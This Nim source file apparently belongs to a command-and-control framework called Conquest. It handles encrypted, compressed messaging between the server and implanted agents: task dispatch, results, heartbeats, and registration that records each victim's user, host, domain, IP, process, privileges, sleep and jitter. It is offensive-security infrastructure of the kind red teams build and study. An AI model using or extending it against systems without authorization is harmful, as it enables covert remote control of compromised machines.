import strutils, streams, times, tables, zippy
import ../../common/[types, utils, serialize, sequence, crypto]

proc serializeTask*(cq: Conquest, task: var Task): seq[byte] = 

    var packer = Packer.init() 

    # Serialize payload
    packer
        .add(task.taskId)
        .add(task.listenerId)
        .add(task.timestamp)
        .add(task.command)
        .add(task.argCount)

    for arg in task.args:
        packer.addArgument(arg)

    let payload = packer.pack() 
    packer.reset()

    # Compress payload body
    let compressedPayload = compress(payload, BestCompression, dfGzip)

    # Encrypt payload body
    let (encData, gmac) = encrypt(cq.agents[Uuid.toString(task.header.agentId)].sessionKey, task.header.iv, compressedPayload, task.header.seqNr)

    # Set authentication tag (GMAC)
    task.header.gmac = gmac

    # Serialize header 
    let header = packer.serializeHeader(task.header, uint32(encData.len))

    return header & encData

proc deserializeTaskResult*(cq: Conquest, resultData: seq[byte]): TaskResult = 

    var unpacker = Unpacker.init(Bytes.toString(resultData))

    let header = unpacker.deserializeHeader()

    # Packet Validation
    validatePacket(header, cast[uint8](MSG_RESULT)) 

    # Decrypt payload 
    let compressedPayload = unpacker.getBytes(int(header.size))
    let decData = validateDecryption(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.iv, compressedPayload, header.seqNr, header)

    # Decompress payload
    let payload = uncompress(decData, dfGzip)

    # Deserialize decrypted data
    unpacker = Unpacker.init(Bytes.toString(payload))

    let 
        taskId = unpacker.getUint32()
        listenerId = unpacker.getUint32()
        timestamp = unpacker.getUint32()
        command = unpacker.getUint16()
        status = unpacker.getUint8()
        resultType = unpacker.getUint8()
        length = unpacker.getUint32()
        data = unpacker.getBytes(int(length))

    return TaskResult(
        header: header,
        taskId: taskId,
        listenerId: listenerId, 
        timestamp: timestamp,
        command: command,
        status: status,
        resultType: resultType,
        length: length,
        data: data
    )

proc deserializeNewAgent*(cq: Conquest, data: seq[byte], remoteAddress: string): Agent = 

    var unpacker = Unpacker.init(Bytes.toString(data))

    let header= unpacker.deserializeHeader()

    # Packet Validation
    validatePacket(header, cast[uint8](MSG_REGISTER)) 

    # Key exchange
    let agentPublicKey = unpacker.getByteArray(Key)
    let sessionKey = deriveSessionKey(cq.keyPair, agentPublicKey)
    
    # Decrypt payload 
    let compressedPayload = unpacker.getBytes(int(header.size)) 
    let decData = validateDecryption(sessionKey, header.iv, compressedPayload, header.seqNr, header)

    # Decompress payload
    let payload = uncompress(decData, dfGzip)

    # Deserialize decrypted data
    unpacker = Unpacker.init(Bytes.toString(payload))

    let 
        listenerId = unpacker.getUint32()
        username = unpacker.getDataWithLengthPrefix()
        hostname = unpacker.getDataWithLengthPrefix()
        domain = unpacker.getDataWithLengthPrefix()
        ipInternal = unpacker.getDataWithLengthPrefix()
        os = unpacker.getDataWithLengthPrefix()
        process = unpacker.getDataWithLengthPrefix()
        pid = unpacker.getUint32() 
        isElevated = unpacker.getUint8()
        sleep = unpacker.getUint32()
        jitter = unpacker.getUint32()
        modules = unpacker.getUint32()

    return Agent(
        agentId: Uuid.toString(header.agentId),
        listenerId: Uuid.toString(listenerId),
        username: username, 
        impersonationToken: "",
        hostname: hostname,
        domain: domain,
        ipInternal: ipInternal,
        ipExternal: remoteAddress,
        os: os,
        process: process,
        pid: int(pid),
        elevated: isElevated != 0,
        sleep: int(sleep),
        jitter: int(jitter),
        modules: modules,
        tasks: @[],  
        firstCheckin: now().toTime().toUnix(),
        latestCheckin: now().toTime().toUnix(),
        sessionKey: sessionKey
    )

proc deserializeHeartbeat*(cq: Conquest, data: seq[byte]): Heartbeat = 

    var unpacker = Unpacker.init(Bytes.toString(data))

    let header = unpacker.deserializeHeader()

    # Packet Validation
    validatePacket(header, cast[uint8](MSG_HEARTBEAT)) 

    # Decrypt payload
    let compressedPayload = unpacker.getBytes(int(header.size))
    let decData = validateDecryption(cq.agents[Uuid.toString(header.agentId)].sessionKey, header.iv, compressedPayload, header.seqNr, header)

    # Decompress payload 
    let payload = uncompress(decData, dfGzip)

    # Deserialize decrypted data
    unpacker = Unpacker.init(Bytes.toString(payload))

    return Heartbeat(
        header: header,
        listenerId: unpacker.getUint32(),
        timestamp: unpacker.getUint32()
    )